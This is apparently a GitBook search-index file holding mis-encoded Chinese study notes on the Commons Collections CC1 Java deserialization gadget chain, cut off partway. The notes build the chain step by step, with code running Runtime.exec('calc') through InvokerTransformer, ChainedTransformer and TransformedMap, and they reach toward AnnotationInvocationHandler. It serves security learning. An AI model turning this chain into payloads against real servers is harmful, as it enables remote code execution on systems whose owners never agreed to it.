{"./":{"url":"./","title":"JavaSec","keywords":"","body":"å‰è¨€ è¿™é‡Œä¸»è¦è®°å½• Java ç›¸å…³ç¬”è®°~ å¼€å‘æ¡†æ¶ Java åŸºç¡€ ååºåˆ—åŒ– åˆ©ç”¨é“¾å­¦ä¹  Shiro Fastjson Struts2 Spring Weblogic Tomcat å†…å­˜ğŸ JavaAgent IAST ...... Copyright & Copy zha0cai all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ä»¶ä¿®è®¢æ—¶é—´ï¼š 2022-10-09 14:03:59 "},"ååºåˆ—åŒ–/Java å®‰å…¨æ¼«è°ˆ - 09 ~ 11.CommonsCollections1.html":{"url":"ååºåˆ—åŒ–/Java å®‰å…¨æ¼«è°ˆ - 09 ~ 11.CommonsCollections1.html","title":"Java å®‰å…¨æ¼«è°ˆ 09 ~ 11.CommonsCollections1","keywords":"","body":"å‰è¨€ ä»æœ¬ç¯‡å¼€å§‹ï¼Œæ­£å¼è¿›å…¥ååºåˆ—åŒ– RCE åˆ©ç”¨é“¾åˆ†æçš„å¤§é—¨ï¼Œå§‹ç»ˆæ˜¯é€ƒä¸è¿‡ã€‚å¤§æ‰‹å­ä»¬çš„æŒ–æ˜çœŸçš„æ‹æ¡ˆå«ç»ï¼Œç²¾å½©ç»ä¼¦ã€‚å­¦å¾’æœ¬å¾’ï¼Œè¿™ç¯‡ç¬”è®°åº”è¯¥æ˜¯äº‹æ— å·¨ç»†çš„äº†ã€‚ JDK æºç ç¯å¢ƒå‡†å¤‡ https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html JDK çš„ç‰ˆæœ¬å·è§£æƒ‘ openJDK å„ä¸ªç‰ˆæœ¬çš„æºç ä¸‹è½½ï¼Œæ–¹ä¾¿æŸ¥çœ‹ native ä¿®é¥°çš„æ–¹æ³• è°ƒè¯•ååºåˆ—åŒ–åˆ©ç”¨é“¾ä¼šå¯¹ jdk çš„ç‰ˆæœ¬ã€Apache Commons Collections çš„ç‰ˆæœ¬æœ‰è¦æ±‚ã€‚ å¦‚ä½•åœ¨ IDEA é‡Œé¢æŸ¥æ‰¾ jdk æºç å‘¢ï¼Ÿæ¯”å¦‚è¯´ä¸‹é¢è¿™ç§ï¼Œä¸€èˆ¬ Find Usages æ˜¯è¿›ä¸åˆ°é‡Œé¢å»çš„ï¼Œå› ä¸ºæ˜¯åç¼–è¯‘ .class æ–‡ä»¶å¾—å‡ºæ¥çš„æºç ã€‚ D:\\Java\\jdk1.8.0_20\\jre\\lib\\rt.jar!\\sun\\reflect\\annotation\\AnnotationInvocationHandler.class æ‰€ä»¥æˆ‘ä»¬è¦å°†æºç åŠ è¿›å»ã€‚ã€Oracle JDK å’Œ Open JDK çš„ç‰ˆæœ¬ä¸ä¸€å®šå¯¹çš„ä¸Šã€‚ã€‘ https://www.oracle.com/java/technologies/downloads/archive/ æ‰¾åˆ° 8u65 --> jdk-8u65-windows-x64.exe å¯ä»¥ç”¨è™šæ‹Ÿæœºå®‰è£…æŠŠ JDK æå–å‡ºæ¥ã€‚ https://openjdk.org/projects/jdk/--> Mercurial â€‹ æœ¬æ¬¡æˆ‘ä½¿ç”¨çš„æ˜¯ 8u20 çš„ JDK ç‰ˆæœ¬ã€‚ å°† \"D:\\Java\\jdk-f5d77a430a29ï¼ˆ1.8.0_20 openJDK æºç ï¼‰\\jdk-f5d77a430a29\\src\\share\\classes\\\" ä¸­çš„ sun æ–‡ä»¶å¤¹æ‹·è´ã€‚ å°† \"D:\\Java\\jdk1.8.0_20\\src.zip\" è§£å‹ å°† 1 ä¸­çš„ sun æ–‡ä»¶å¤¹æ‹·è´åˆ°è§£å‹å‡ºæ¥çš„ sun æ–‡ä»¶å¤¹ä¸­ åœ¨ idea ä¸­æ·»åŠ  sun æ–‡ä»¶å¤¹ã€‚ã€File --> Project Settings --> SDKs --> Sourcepathã€‘ å¯ä»¥çœ‹åˆ° AnnotationInvocationHandler å·²ç»ç”± .class æ–‡ä»¶ å˜æˆäº† .java æ–‡ä»¶ ã€‚ â€‹ ååºåˆ—é“¾åŸç† ååºåˆ—åŒ–æ¼æ´å°±æ˜¯ï¼š Web åº”ç”¨ååºåºåˆ—åŒ–ç”¨æˆ·è¾“å…¥ï¼ˆä¿¡ä»»/ä¸å—ä¿¡ä»»ï¼‰ï¼Œå³å¯æ§çš„åºåˆ—åŒ–ç‚¹ã€‚ å­˜åœ¨ååºåˆ—åŒ–åˆ©ç”¨é“¾ --> RCE This is what serialized Java objects look like, they can be identified by this header. They always begin with â€œac ed 00 05â€¦â€ and when that is base64 encoded it comes out as â€œrO0â€¦â€. Keep an eye open for those two strings. lsof -i -P | grep java | grep LISTEN æ¥æ”¶ä»»æ„å¯¹è±¡æ‰§è¡Œ readObject æ–¹æ³•è¿›è¡Œååºåˆ—åŒ– --> é‡å†™çš„ readObject æ–¹æ³•ï¼Œé‡Œé¢å­˜åœ¨æ¥æ”¶ä»»æ„å¯¹è±¡ä½œä¸ºå‚æ•°çš„æ–¹æ³•ï¼ˆå¯åºåˆ—åŒ– -- é›†åˆç±»å‹/Object/Mapï¼‰ --> ...... --> è°ƒç”¨å±é™©æ–¹æ³•ï¼ˆä¸åŒç±»çš„åŒåå‡½æ•°/ä»»æ„æ–¹æ³•è°ƒç”¨ï¼ˆåå°„/åŠ¨æ€åŠ è½½å­—èŠ‚ç ï¼‰ï¼‰ã€‚ã€A.readObject.invoke/ --> B.fã€‘ è°ƒè¯•åˆ†æ åˆæ¢ æ ¹æ® CC1 é“¾æˆ‘ä»¬çŸ¥é“å’Œ Transformer æœ‰å…³ï¼ŒæŸ¥çœ‹ä¸€ä¸‹ org.apache.commons.collections.Transformer çš„å®ç°ç±»ä¸€å…±æœ‰ 16 ä¸ªã€‚ã€ä»¥æ­¤åæ¨ã€‘ ä» CC1 å‡ºå‘ç›´æ¥çœ‹ InvokerTransformer ç±»ã€‚ æ™®é€šåå°„ Runtime.exec æ‰§è¡Œå‘½ä»¤ Runtime run = Runtime.getRuntime() ç›´æ¥è·å–ï¼Œ Runtime ç±»ä¸èƒ½åºåˆ—åŒ–ã€‚ java.lang.Runtime æ²¡æœ‰ç»§æ‰¿ Serializable ç±»ã€‚ -- ç”¨åå°„åˆ›å»º Runtime å¯¹è±¡å³å¯ã€‚ /** * æ™®é€šçš„ Runtime.exec åå°„ * Runtime.getRuntime().exec(\"calc\"); * ç±»å…¨åè·å–ç±»çš„ Class å¯¹è±¡ ã€ç±»çš„åŸå‹ï¼ˆClass ç±»å¯ä»¥ç†è§£ä¸ºç±»çš„ç±»ï¼Œæ¯ä¸ªç±»éƒ½æœ‰ä¸€ä¸ªå¯¹åº”çš„ Class å¯¹è±¡ï¼‰ã€‘ * getMethodï¼šæ–¹æ³•åï¼Œæ–¹æ³•å‚æ•°ç±»å‹ ã€æ— å‚æ–¹æ³•åˆ™æ–¹æ³•å‚æ•°ç±»å‹ä¸º nullã€‘ * invokeï¼šè·å–åˆ°çš„ç±»çš„å®ä¾‹åŒ–å¯¹è±¡ï¼Œæ–¹æ³•çš„å‚æ•° ã€å¦‚æœæ˜¯é™æ€æ–¹æ³•åˆ™ä¸º nullï¼Œæ— å‚ nullã€‘å› ä¸ºé™æ€æ–¹æ³•å±äºç±»ï¼Œä¸å±äºç±»å¯¹è±¡ï¼Œæ‰€ä»¥å¯¹è±¡ä¸º nullã€‚ */ Class clazz = Class.forName(\"java.lang.Runtime\"); Method getruntimeMethod = clazz.getMethod(\"getRuntime\", null); Object runtimeObj = getruntimeMethod.invoke(null, null); Method method = clazz.getMethod(\"exec\", String.class); method.invoke(runtimeObj, \"calc\"); InvokeTransformer åå°„æ‰§è¡Œå‘½ä»¤ org.apache.commons.collections.functors.InvokerTransformer çœ‹ä¸€ä¸‹å…¶ä¸­å®ç°çš„ transform æ–¹æ³•ã€‚ã€å±é™©æ–¹æ³• --> RCEã€‘ // æ¥æ”¶ä»»æ„å¯¹è±¡ Object ä½œä¸ºè¾“å…¥ public Object transform(Object input) { if (input == null) { return null; } try { // è·å–è¾“å…¥çš„ä»»æ„ç±»çš„ Class å¯¹è±¡ï¼Œåå°„æ‰§è¡Œå¯¹è±¡çš„ä»»æ„æ–¹æ³• Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); } catch (NoSuchMethodException ex) { throw new FunctorException(\"InvokerTransformer: The method '\" + iMethodName + \"' on '\" + input.getClass() + \"' does not exist\"); } catch (IllegalAccessException ex) { throw new FunctorException(\"InvokerTransformer: The method '\" + iMethodName + \"' on '\" + input.getClass() + \"' cannot be accessed\"); } catch (InvocationTargetException ex) { throw new FunctorException(\"InvokerTransformer: The method '\" + iMethodName + \"' on '\" + input.getClass() + \"' threw an exception\", ex); } } è¿™ä¸ª InvokeTransformer çš„ transform æ–¹æ³•å…¶å®å°±æ˜¯ä¸€ä¸ªç”¨åå°„å®ç°çš„æ‰§è¡Œä»»æ„æ–¹æ³•çš„æ–¹æ³•ã€‚ã€å±é™©æ–¹æ³•ã€‘ æ¥ç€çœ‹çœ‹ InvokerTransformer çš„æ„é€ å‡½æ•°ã€‚org.apache.commons.collections.functors.InvokerTransformer#InvokerTransformer public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) { super(); iMethodName = methodName; iParamTypes = paramTypes; iArgs = args; } // åé¢åå°„æ‰§è¡Œæ–¹æ³•çš„å‚æ•°éƒ½æ˜¯é€šè¿‡è¿™ä¸ªæ„é€ å‡½æ•°è·å–çš„ï¼Œå¯ä»¥çœ‹åˆ°éœ€è¦çš„å‚æ•°ä¾æ¬¡ä¸ºï¼Œéœ€è¦æ‰§è¡Œçš„æ–¹æ³•å methodNameï¼Œ æ‰€éœ€æ‰§è¡Œæ–¹æ³•çš„å‚æ•°çš„ç±»å‹ paramTypesï¼Œéœ€è¦æ‰§è¡Œçš„æ–¹æ³•çš„å‚æ•°å€¼ argsã€‚ é‚£ä¹ˆå°†åå°„æ‰§è¡Œ java.lang.Runtime#exec(java.lang.String) æ”¹æˆ InvokerTransformer åå°„æ‰§è¡Œçš„å½¢å¼å°±å¦‚ä¸‹ã€‚ åˆ›å»º InvokeTransformer çš„å®ä¾‹å¯¹è±¡ï¼Œè°ƒç”¨ transform æ–¹æ³•ã€‚ æ–¹æ³•åã€å‚æ•°ç±»å‹ã€å‚æ•°å€¼éƒ½é€šè¿‡æ„é€ å‡½æ•°è·å–ã€‚ æ‰€éœ€å¯¹è±¡é€šè¿‡ transform æ–¹æ³•æ¥æ”¶ã€‚ /** * æ”¹å†™æˆ InvokeTransformer çš„ç‰ˆæœ¬ï¼š * 1. æˆ‘ä»¬è¦æ‰§è¡Œ Runtime å¯¹è±¡çš„ exec æ–¹æ³•ã€‚ * 2. é‚£ä¹ˆæˆ‘ä»¬å°±è¦ç»™ transform æ–¹æ³•ä¼ è¿›å»ä¸€ä¸ª Runtime å¯¹è±¡ï¼Œå†é€šè¿‡åå°„æ‰§è¡Œ exec æ–¹æ³•ã€‚ * ã€æ³¨ã€‘ï¼šæš‚æ—¶ä¸è€ƒè™‘åºåˆ—åŒ– */ InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\", new Class[] {String.class}, new Object[]{\"calc\"}); invokerTransformer.transform(Runtime.getRuntime()); ---------- èƒ½ä¸èƒ½ç›´æ¥åå°„æ‰§è¡Œ getRuntime æ–¹æ³•è¿›è¡Œå®ä¾‹åŒ–åˆ›å»ºå¯¹è±¡å‘¢ï¼Ÿè¿™æ˜¯æ¥è‡ªåå°„æ²¡å­¦å¥½çš„æˆ‘ä¸€ç¬é—´çš„æƒ³æ³• orzã€‚ /** * ç­”æ¡ˆæ˜¯ä¸èƒ½çš„ã€‚ * - Runtime ç±»ç›´æ¥è°ƒç”¨å®ƒçš„é™æ€æ–¹æ³• getRuntimeã€‚ * - Runtime ç±»ä¸å¯åºåˆ—åŒ–ï¼Œå…¶æ¬¡ Runtime.class è·å–çš„æ˜¯ Runtime ç±»çš„ Class å®ä¾‹å¯¹è±¡ã€‚ Class ç±»å¹¶æ²¡æœ‰ getRuntime æ–¹æ³•ã€‚ * - Exception in thread \"main\" org.apache.commons.collections.FunctorException: InvokerTransformer: The method 'getRuntime' on 'class java.lang.Class' does not exist * at org.apache.commons.collections.functors.InvokerTransformer.transform(InvokerTransformer.java:128) */ InvokerTransformer getRuntimeInvokeTransformer = new InvokerTransformer(\"getRuntime\", new Class[]{null}, new Object[]{null}); Object runtimeObj = getRuntimeInvokeTransformer.transform(Runtime.class); ---------- // å°† Runtime.getRumtime() ä¹Ÿè¦æ”¹æˆ InvokerTransformer çš„åå°„å½¢å¼ /** * æ”¹å†™æˆ InvokeTransformer çš„ç‰ˆæœ¬ï¼š * 1. æˆ‘ä»¬è¦æ‰§è¡Œ Runtime å¯¹è±¡çš„ exec æ–¹æ³•ã€‚ * 2. é‚£ä¹ˆæˆ‘ä»¬å°±è¦ç»™ transform æ–¹æ³•ä¼ è¿›å»ä¸€ä¸ª Runtime å¯¹è±¡ï¼Œé€šè¿‡åå°„è·å– Runtime å¯¹è±¡ã€‚ * 3. å†é€šè¿‡åå°„æ‰§è¡Œ exec æ–¹æ³•ã€‚ */ // åå°„è·å– Runtime å®ä¾‹åŒ–å¯¹è±¡ã€‚clazz å¯¹è±¡çš„ getMethod æ–¹æ³•ï¼Œåå°„è°ƒç”¨ getMethod æ–¹æ³•ã€‚ //Class clazz = Class.forName(\"java.lang.Runtime\"); //Method getruntimeMethod = clazz.getMethod(\"getRuntime\", null); InvokerTransformer getMethodInvokerTransformer = new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}); Method getRuntimeMethod = (Method) getMethodInvokerTransformer.transform(Runtime.class);// getMethod æ–¹æ³•æ˜¯ Class å®ä¾‹å¯¹è±¡çš„æ–¹æ³•ï¼Œæ‰€ä»¥ä¼ è¿›å» Class å®ä¾‹å¯¹è±¡ã€‚ // Object runtimeObj = getruntimeMethod.invoke(null, null); InvokerTransformer invokeInvokerTransformer = new InvokerTransformer(\"invoke\", new Class[] {Object.class, Object[].class}, new Object[] {null, null}); Object runtimeObj = invokeInvokerTransformer.transform(getRuntimeMethod); // invoke æ–¹æ³•æ˜¯ Method å®ä¾‹å¯¹è±¡çš„æ–¹æ³•ï¼Œæ‰€ä»¥ä¼ è¿›å» Method å®ä¾‹å¯¹è±¡ //Method method = clazz.getMethod(\"exec\", String.class); //method.invoke(runtimeObj, \"calc\"); InvokerTransformer execInvokerTransformer = new InvokerTransformer(\"exec\", new Class[] {String.class}, new Object[]{\"calc\"}); execInvokerTransformer.transform(runtimeObj); new InvokerTransformer(\"éœ€è¦è°ƒç”¨çš„æ–¹æ³•å\", new Class[] {æ–¹æ³•çš„å‚æ•°ç±»å‹}, new Object[]{æ–¹æ³•çš„å‚æ•°å€¼}).transform(æ˜¯å“ªä¸ªç±»çš„å®ä¾‹å¯¹è±¡ã€Objectã€‘çš„æ–¹æ³•); ã€æ³¨æ„ã€‘å¯å˜å‚æ•°ç±»å‹å³å¯¹åº”ä¸ºæ•°ç»„ç±»å‹ï¼Œå¦‚ ï¼š Class... parameterTypes ç­‰ä»·äº Class [].class â€ æœ€ç»ˆæ˜¯ä¸€ä¸ªå¥—å¨ƒçš„å½¢å¼ï¼Œé‡Œå±‚çš„å¯¹è±¡ç»™å¤–å±‚ä½¿ç”¨ï¼Œä½œä¸ºä¸Šä¸€ä¸ª transform æ–¹æ³•çš„ Object å‚æ•°ã€‚ // åå°„è·å– Runtime å®ä¾‹åŒ–å¯¹è±¡ã€‚clazz å¯¹è±¡çš„ getMethod æ–¹æ³•ï¼Œåå°„è°ƒç”¨ getMethod æ–¹æ³•å®ä¾‹åŒ– Runtime å¯¹è±¡ã€‚ã€æ³¨æ„ã€‘å¯å˜å‚æ•°å‚æ•°ç±»å‹å³å¯¹åº”çš„æ•°ç»„ã€‚ // åœ¨åå°„æ‰§è¡Œ exec æ–¹æ³•ã€‚ã€åä¸€ä¸ªä½œä¸ºå‰ä¸€ä¸ªçš„è¾“å…¥å¯¹è±¡ã€‘ new InvokerTransformer(\"exec\", new Class[] {String.class}, new Object[]{\"calc\"}) .transform(new InvokerTransformer(\"invoke\", new Class[] {Object.class, Object[].class}, new Object[] {null, null}) .transform(new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}) .transform(Runtime.class))); // ä»ä¸‹å¾€ä¸Šä¼  ä»ä¸Šä¸¤æ®µä»£ç å¯ä»¥çœ‹å‡ºï¼Œå‰ä¸€ä¸ª InvokeTransformer åˆ›å»ºå‡ºæ¥çš„å¯¹è±¡ä¾›ä¸‹ä¸€ä¸ª InvokerTransformer.transform ä½œä¸ºå¯¹è±¡è¾“å…¥ã€‚æ‰€ä»¥å…ˆæ ¹æ® ysoserial.payloads.CommonsCollections1 ä¼˜åŒ–ä¸€ä¸‹ä»£ç ï¼Œåˆ›å»º ä¸€ä¸ª ChainedTransformer å’Œ Transformer æ•°ç»„ã€‚ org.apache.commons.collections.functors.ChainedTransformer /** * Constructor that performs no validation. * Use getInstance if you want that. * * @param transformers the transformers to chain, not copied, no nulls */ public ChainedTransformer(Transformer[] transformers) { super(); iTransformers = transformers; } /** * Transforms the input to result via each decorated transformer * * @param object the input object passed to the first transformer * @return the transformed result */ public Object transform(Object object) { for (int i = 0; i å°±å¯ä»¥æ”¹æˆ Transformer [] transformers = new Transformer[] { new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); chainedTransformer.transform(Runtime.class); ----------> æ¯”è¾ƒæ¸…æ™°ï¼Œè§£é‡Šä¸€ä¸‹ï¼š chainedTransformer.transform(Runtime.class); // æ§åˆ¶ç¬¬ä¸€ä¸ªè¾“å…¥å°±å¥½äº† ==> object = iTransformers[i].transform(object); é‚£ä¹ˆç¬¬ä¸€ä¸ªå°±æ˜¯ ==> iTransformers[0].transform(Runtime.class) å³ ==> new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}).transform(Runtime.class) å¹¶ä¸”èµ‹å€¼ç»™äº† objectï¼Œé‚£ä¹ˆç¬¬äºŒä¸ªå°±æ˜¯ ==> iTransformers[1].transform(object); ä»¥æ­¤ç±»æ¨... â€‹ é‚£ä¹ˆç°åœ¨é—®é¢˜å˜æˆäº†æœ‰å“ªäº›å¯¹è±¡è°ƒç”¨ org.apache.commons.collections.functors.InvokerTransformer#transform è¿™ä¸ªå±é™©æ–¹æ³•å‘¢ï¼Ÿ ä¸‹ä¸€æ­¥å°±æ˜¯æ‰¾åˆ°ä½¿ç”¨ InvokerTransformer#transform æ–¹æ³•çš„åœ°æ–¹ï¼Œé€šè¿‡ Find Usages å¯ä»¥çœ‹åˆ°æœ‰ 21 å¤„è°ƒç”¨ã€‚ â€‹ é™¤å»è‡ªå·±è°ƒç”¨è‡ªå·±çš„ï¼Œä¸»è¦åˆ†å¸ƒåœ¨ commons-collections:commons-collections:3.1 å’Œ commons-beanutils:commons-beanutils:1.9.2 è¿™ä¸¤ä¸ªåŒ…ä¸­ï¼Œæˆ‘ä»¬é€ä¸€è¿›è¡Œç­›æŸ¥ã€‚ æ­£æ‰€è°“å‰äººæ ½æ ‘ï¼ŒæŒ‰ç…§ CC1 é“¾çš„æç¤ºï¼Œæˆ‘ä»¬æŠŠç›®å…‰é”å®šåœ¨ map package ä¸­çš„ LazyMap ç±»å’Œ TransformedMap ç±»ä¸Šã€‚ Ysoserial CC1 åˆ†æ TransformedMap åˆ©ç”¨é“¾ ä¸€å…±æœ‰ 3 ä¸ªæ–¹æ³•è°ƒç”¨äº† transformer æ–¹æ³•ï¼Œåˆ†åˆ«æ˜¯ï¼štransformKeyã€transformValueã€checkSetValue ã€‚ protected Object transformKey(Object object) { if (keyTransformer == null) { return object; } return keyTransformer.transform(object); } ----------- protected Object transformValue(Object object) { if (valueTransformer == null) { return object; } return valueTransformer.transform(object); } ----------- protected Object checkSetValue(Object value) { return valueTransformer.transform(value); } ä»¥ checkSetValue ä¸ºå…¥å£ç‚¹ï¼š æ˜¯å®ç°äº†æ¥å£ï¼Œæ³¨é‡Šå†™çš„å¾ˆæ¸…æ¥šäº†ã€‚org.apache.commons.collections.map.AbstractInputCheckedMapDecorator#checkSetValue /** * Hook method called when a value is being set using setValue. * * An implementation may validate the value and throw an exception * or it may transform the value into another object. * * This implementation returns the input value. * * @param value the value to check * @throws UnsupportedOperationException if the map may not be changed by setValue * @throws IllegalArgumentException if the specified value is invalid * @throws ClassCastException if the class of the specified value is invalid * @throws NullPointerException if the specified value is null and nulls are invalid */ protected abstract Object checkSetValue(Object value); valueTransformer æ˜¯ä»€ä¹ˆå€¼ã€‚ é€šè¿‡æ„é€ å‡½æ•°èµ‹å€¼çš„ï¼Œå¹¶ä¸” TransformerMap çš„è¿™ä¸ªæ„é€ å‡½æ•°æ˜¯ protected ä¿®é¥°çš„ï¼Œé€šè¿‡é™æ€æ–¹æ³• decorate è°ƒç”¨ã€‚ å†é€šè¿‡ Find Usages æŸ¥çœ‹ checkSetValue çš„è°ƒç”¨æƒ…å†µã€‚ protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) { super(map); this.keyTransformer = keyTransformer; this.valueTransformer = valueTransformer; } // ç»§ç»­åœ¨æœ¬ç±»ä¸­å¯»æ‰¾æ˜¯å“ªä¸ªå‡½æ•°è°ƒç”¨äº†æ„é€ å‡½æ•°ï¼Œç­”æ¡ˆæ˜¯é™æ€çš„ decorate æ–¹æ³•ã€‚ç”¨æ¥è£…é¥°ä¸€ä¸ª mapã€‚ä¸€å®šè¦å¤šçœ‹çœ‹æºç å’Œæ³¨é‡Šã€‚ public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) { return new TransformedMap(map, keyTransformer, valueTransformer); } å†ç»§ç»­çœ‹çœ‹è°ƒç”¨äº† checkSetValue çš„åœ°æ–¹ï¼Œ ä»…æœ‰ä¸€å¤„ org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.MapEntry#setValue â€‹ /** * Implementation of a map entry that checks additions via setValue. */ static class MapEntry extends AbstractMapEntryDecorator { /** The parent map */ private final AbstractInputCheckedMapDecorator parent; protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) { super(entry); this.parent = parent; } public Object setValue(Object value) { value = parent.checkSetValue(value); return entry.setValue(value); } } Java ä¸­éå† map çš„å…¶ä¸­ä¸€ä¸ªæ–¹æ³•ï¼Œhttps://www.baeldung.com/java-map-entryã€‚ As Map.Entry stores both the key and value together in one class, we get them both in a single operation . æˆ‘ä»¬å…ˆå°è¯•ä¸‹é€šè¿‡ MapEntry éå†æ¥ setValue èƒ½ä¸èƒ½èµ°åˆ° checkSetValueï¼Œè¿›è€Œè°ƒç”¨å±é™©æ–¹æ³• transformã€‚https://docs.oracle.com/javase/8/docs/api/java/util/Map.Entry.html MapEntry éå†ï¼Œé€šè¿‡ setValue ä¿®æ”¹æµ‹è¯• HashMap hashMap = new HashMap(); hashMap.put(\"zhaocai\", \"mao\"); hashMap.put(\"ff\", \"xn\"); for (Map.Entry entry : hashMap.entrySet()) { entry.setValue(\"zhu\"); } System.out.println(\"key zhaocai value is: \" + hashMap.get(\"zhaocai\")); System.out.println(\"key ff value is: \" + hashMap.get(\"ff\")); ---------- key zhaocai value is: zhu key ff value is: zhu Process finished with exit code 0 MapEntry éå†ï¼Œé€šè¿‡ setValue åˆ©ç”¨æµ‹è¯• InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\", new Class[] {String.class}, new Object[]{\"calc\"}); //invokerTransformer.transform(Runtime.getRuntime()); HashMap hashMap = new HashMap(); hashMap.put(\"zhaocai\", \"mao\"); Map transformedMap = TransformedMap.decorate(hashMap, null, invokerTransformer); for (Map.Entry entry : transformedMap.entrySet()) { entry.setValue(Runtime.getRuntime()); // æ³¨æ„è¿™é‡Œä¼ è¿›å»çš„æ˜¯ Runtime å¯¹è±¡ } System.out.println(\"key zhaocai value is: \" + hashMap.get(\"zhaocai\")); ---------- æˆåŠŸåˆ©ç”¨ key zhaocai value is: java.lang.ProcessImpl@108c4c35 Process finished with exit code 0 Map ä¹‹é—´çš„ç»§æ‰¿å…³ç³» 1. java.util.Map 2. public abstract class AbstractMapDecorator implements Map 3. abstract class AbstractInputCheckedMapDecorator extends AbstractMapDecorator 4. public class TransformedMap extends AbstractInputCheckedMapDecorator implements Serializable åˆ°è¿™é‡Œæˆ‘ä»¬å…ˆæ€»ç»“ä¸€ä¸‹æ€è·¯ï¼šåˆ›å»ºä¸€ä¸ªéç©ºçš„ map ã€è¿™æ ·è°ƒç”¨ä¸ºç©ºçš„è¯å°±æ²¡æ³• setValue äº†ã€‘--> æ¥ç€é€šè¿‡ TransformedMap.decorate æ–¹æ³•æ¥è£…é¥°è¿™ä¸ª mapï¼Œé€šè¿‡ TransformedMap çš„æ„é€ å‡½æ•°å°† valueTransformer ä¿®æ”¹ä¸º InvokerTransformer çš„å¯¹è±¡ invokerTransformerï¼Œ --> æœ€åé€šè¿‡ Map.Entry éå†ï¼Œç”¨ setValue æ¥ä¿®æ”¹éç©º map çš„ value å€¼ä¸ºæƒ³æ‰§è¡Œæ–¹æ³•çš„å¯¹è±¡å°±å¯ä»¥æ‰§è¡Œè¿™ä¸€éƒ¨åˆ†çš„åˆ©ç”¨é“¾ã€‚ org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.MapEntry#setValue --> org.apache.commons.collections.map.TransformedMap#checkSetValue --> valueTransformer.transform(value) -- è¿™é‡Œæˆ‘ä»¬éœ€è¦æ‰§è¡Œ exec æ–¹æ³•ï¼Œ value å°±éœ€è¦ä¸º Runtime å¯¹è±¡ã€‚ å…¶å®è¿™ä¸€é•¿ä¸²çš„æ„é€ å°±æ˜¯ä¸ºäº†è¿é€š readObject å’Œ InvokeTransformer#transform é‚£ä¹ˆæœ€åæˆ‘ä»¬å°±ç»§ç»­çœ‹çœ‹æœ‰æ²¡æœ‰ç±»çš„ readObject æ–¹æ³•ç›´æ¥è°ƒç”¨ï¼ˆæˆ–è€… invoke ï¼‰äº† setValue æ–¹æ³•ï¼Œæ²¡æœ‰çš„è¯å¯èƒ½éœ€è¦å¤šèµ°ä¸€å±‚ç”šè‡³å‡ å±‚ï¼Œç›´åˆ°ååºåˆ—åŒ–çš„å…¥å£ readObject æ–¹æ³•ã€‚è¿˜æ˜¯ Find Usages + å‰äººæ ½æ ‘å¤§æ³•ç›´å¥”ä¸»é¢˜ã€‚ã€æ¯•ç«Ÿæ˜¯åˆ†æå­¦ä¹ ï¼Œè€Œä¸æ˜¯åˆ©ç”¨é“¾æŒ–æ˜å˜›ã€‘sun.reflect.annotation.AnnotationInvocationHandler#readObject â€‹ sun.reflect.annotation.AnnotationInvocationHandler è¿™ä¸ªç±»æ˜¯ä¸ªé»˜è®¤ä¿®é¥°ç±»å‹ã€‚ default (å³é»˜è®¤ï¼Œä»€ä¹ˆä¹Ÿä¸å†™ï¼‰: åœ¨åŒä¸€åŒ…å†…å¯è§ã€æ‰€ä»¥åˆ©ç”¨çš„æ—¶å€™è¦ç”¨åå°„è·å–ã€‘ï¼Œä¸ä½¿ç”¨ä»»ä½•ä¿®é¥°ç¬¦ã€‚ä½¿ç”¨å¯¹è±¡ï¼šç±»ã€æ¥å£ã€å˜é‡ã€æ–¹æ³•ã€‚https://www.runoob.com/java/java-modifier-types.html class AnnotationInvocationHandler implements InvocationHandler, Serializable{} AnnotationInvocationHandler æœ‰ä¸€ä¸ªå”¯ä¸€çš„æ„é€ å‡½æ•° // ä¸¤ä¸ªå‚æ•°åˆ†åˆ«æ˜¯æ³¨è§£ç±»å‹å’Œ Map ç±»å‹ AnnotationInvocationHandler(Class type, Map memberValues) { this.type = type; this.memberValues = memberValues; } sun.reflect.annotation.AnnotationInvocationHandler#readObject æ–¹æ³• private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { s.defaultReadObject(); // Check to make sure that types have not evolved incompatibly AnnotationType annotationType = null; try { annotationType = AnnotationType.getInstance(type); } catch(IllegalArgumentException e) { // Class is no longer an annotation type; time to punch out throw new java.io.InvalidObjectException(\"Non-annotation type in annotation serial stream\"); } Map> memberTypes = annotationType.memberTypes(); // If there are annotation members without values, that // situation is handled by the invoke method. for (Map.Entry memberValue : memberValues.entrySet()) { String name = memberValue.getKey(); Class memberType = memberTypes.get(name); if (memberType != null) { // i.e. member still exists Object value = memberValue.getValue(); if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) { memberValue.setValue( new AnnotationTypeMismatchExceptionProxy( value.getClass() + \"[\" + value + \"]\").setMember( annotationType.members().get(name))); } } } } é€šè¿‡åå°„åˆ›å»º AnnotationInvocationHandler å¯¹è±¡ï¼Œå¹¶è°ƒç”¨ readObject æ–¹æ³•ã€‚ // é€šè¿‡ InvokerTransformer åå°„è°ƒç”¨ exec æ–¹æ³• InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\", new Class[] {String.class}, new Object[]{\"calc\"}); //invokerTransformer.transform(Runtime.getRuntime()); // åˆ›å»ºä¸€ä¸ª Map å¹¶ç»è¿‡ TransformedMap.decorate è£…é¥° HashMap hashMap = new HashMap(); hashMap.put(\"zhaocai\", \"mao\"); Map transformedMap = TransformedMap.decorate(hashMap, null, invokerTransformer); // åå°„è·å– AnnotationInvocationHandler 